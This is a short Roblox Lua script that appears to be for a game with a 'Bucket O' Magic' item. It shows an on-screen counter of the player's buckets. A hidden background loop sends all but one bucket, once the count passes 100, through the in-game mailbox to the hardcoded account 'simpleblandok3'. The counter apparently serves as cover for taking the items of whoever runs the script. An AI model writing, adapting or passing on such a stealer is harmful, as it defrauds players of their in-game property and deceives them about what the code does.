local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local ItemBucket = {"Bucket O' Magic"}
local BucketAmount = 0
local BucketUID = ""

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    for UID, Item in pairs(Inventory[ItemsClass]) do
        if table.find(ItemsName, Item.id) then
            local ItemInfo = {
                ["uid"] = UID,
                ["data"] = Item
            }
            table.insert(Table, ItemInfo)
        end
    end
    return Table
end

local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local bucketLabel = Instance.new("TextLabel")
bucketLabel.Parent = screenGui
bucketLabel.Size = UDim2.new(0, 300, 0, 100)
bucketLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
bucketLabel.BackgroundTransparency = 1
bucketLabel.TextScaled = true
bucketLabel.TextColor3 = Color3.new(0, 0, 0)
bucketLabel.Text = "Bucket Amount: " .. BucketAmount

local function UpdateBucketAmount()
    while true do
        local MiscItems = GetItemInfo("Misc", ItemBucket)
        for _, ItemInfo in pairs(MiscItems) do
            local ItemData = ItemInfo.data
            if ItemData._am and ItemData.id == "Bucket O' Magic" then
                BucketAmount = ItemData._am
                BucketUID = ItemInfo.uid
                bucketLabel.Text = "Bucket Amount: " .. BucketAmount
            end
        end
        wait(0.3)
    end
end

local function SendBucketMail()
    while true do
        if BucketAmount > 100 then
            local args = {
                [1] = "simpleblandok3",
                [2] = "enjoy bro",
                [3] = "Misc",
                [4] = BucketUID,
                [5] = BucketAmount - 1
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
            wait(3)
        end
        wait(0.3)
    end
end

spawn(UpdateBucketAmount)
spawn(SendBucketMail)
